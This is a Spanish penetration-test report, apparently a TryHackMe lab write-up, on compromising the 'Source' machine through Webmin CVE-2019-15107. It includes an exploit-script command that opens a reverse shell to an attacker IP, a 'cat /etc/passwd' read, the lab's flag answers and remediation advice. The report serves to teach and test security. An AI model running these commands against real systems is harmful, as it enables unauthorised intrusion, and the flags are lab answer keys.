---
title: "Informe de Prueba de Penetración – Máquina Source"
author: "Raúl Durán Ortiz"
date: "2025-08-15"
classification: "Confidencial"
---

### **1. Resumen Ejecutivo**

En esta prueba de penetración, se evaluó la seguridad de la máquina "Source" (IP: `10.201.65.181`). Se descubrió una vulnerabilidad crítica de ejecución remota de comandos (RCE) no autenticada en el servicio Webmin, identificada como **CVE-2019-15107**. Esta vulnerabilidad fue explotada exitosamente desde la IP del atacante (`10.23.159.27`), otorgando acceso completo al sistema con privilegios de `root`.

**Hallazgo Principal:**
*   **Vulnerabilidad:** Ejecución Remota de Comandos en Webmin (CVE-2019-15107).
*   **Riesgo:** Crítico.
*   **Impacto:** Compromiso total del sistema, permitiendo a un atacante tomar control absoluto del servidor.

Se recomienda aplicar de manera urgente las medidas de remediación detalladas en la sección 6 de este informe, comenzando por la actualización inmediata del software Webmin.

---

### **2. Detalles de la Evaluación**

*   **Objetivo:** Evaluar la seguridad del host "Source" e identificar fallos que permitan el acceso no autorizado.
*   **Alcance (IP Víctima):** `10.201.65.181`
*   **IP del Atacante:** `10.23.159.27` (Desde esta IP se originaron las pruebas y se recibió la conexión inversa).

---

### **3. Metodología**

Se siguió una metodología estándar de pruebas de penetración, que incluye las siguientes fases:

1.  **Reconocimiento:** Escaneo de puertos y servicios con `nmap`.
2.  **Enumeración:** Análisis de los servicios descubiertos y búsqueda de directorios web con `gobuster`.
3.  **Explotación:** Aprovechamiento de la vulnerabilidad CVE-2019-15107 para obtener acceso.
4.  **Post-explotación:** Búsqueda de información sensible y demostración del impacto.

---

### **4. Fase de Enumeración: Hallazgos Detallados**

*   **Herramientas:** `nmap`, `gobuster`.
*   **Resultados del Escaneo de Puertos:**
    *   Puerto `10000/tcp` abierto, correspondiente al panel de administración de Webmin.
*   **Análisis de Servicios:**
    *   La versión de Webmin detectada (anterior a 1.930) es vulnerable a **CVE-2019-15107**, que permite la inyección de comandos en el parámetro `old` del fichero `password_change.cgi`.
*   **Descubrimientos Adicionales:**
    *   Se identificó un directorio `/source` que exponía el código fuente de una aplicación, lo que representa un riesgo de divulgación de información.

---

### **5. Fase de Explotación y Post-Explotación**

Se explotó exitosamente la vulnerabilidad CVE-2019-15107 utilizando un script público para establecer una *reverse shell* hacia la máquina del atacante.

*   **Comando de Explotación:**
    ```bash
    ./webmin_exploit.py 10.201.65.181 10000 10.23.159.27 4444
    ```
    Donde los parámetros son:
    -   `10.201.65.181`: IP de la máquina víctima (Source).
    -   `10000`: Puerto del servicio Webmin vulnerable.
    -   `10.23.159.27`: IP de la máquina atacante (LHOST) para recibir la conexión.
    -   `4444`: Puerto de escucha en la máquina atacante (LPORT).

*   **Resultado:**
    *   Se obtuvo una *reverse shell* con privilegios de `root`.
*   **Evidencias (Flags):**
    *   `user.txt`: `THM{SUPPLY_CHAIN_COMPROMISE}`
    *   `root.txt`: `THM{UPDATE_YOUR_INSTALL}`

**Comandos Ejecutados Post-Explotación:**

| Comando           | Descripción                            |
| :---------------- | :------------------------------------- |
| `whoami`          | Verificar el usuario actual (`root`).  |
| `uname -a`        | Obtener información del sistema operativo. |
| `cat /etc/passwd` | Listar los usuarios del sistema.       |
| `cat /root/root.txt` | Leer la flag del usuario `root`.       |

---

### **6. Recomendaciones y Remediación**

Se recomienda aplicar las siguientes medidas correctivas, priorizadas por nivel de riesgo:

| Prioridad | Recomendación                  | Detalle                                                                                      |
| :-------- | :----------------------------- | :------------------------------------------------------------------------------------------- |
| **Crítica** | **Actualizar Webmin**            | Actualizar a la última versión estable para mitigar la vulnerabilidad CVE-2019-15107.      |
| **Alta**    | **Restringir Acceso**            | Implementar un firewall para limitar el acceso al puerto 10000, permitiendo únicamente IPs autorizadas. |
| **Media**   | **Eliminar Código Fuente Expuesto** | Borrar el directorio `/source` para evitar la divulgación de información sensible.          |
| **Baja**    | **Monitorización y Alertas**     | Configurar alertas para detectar intentos de acceso no autorizados a puertos administrativos. |

---

### **7. Anexos**

*   **Anexo A:** Capturas de pantalla de la explotación (`evidencias/source/exploit.png`).
*   **Anexo B:** Logs de la herramienta (`evidencias/source/logs.txt`).
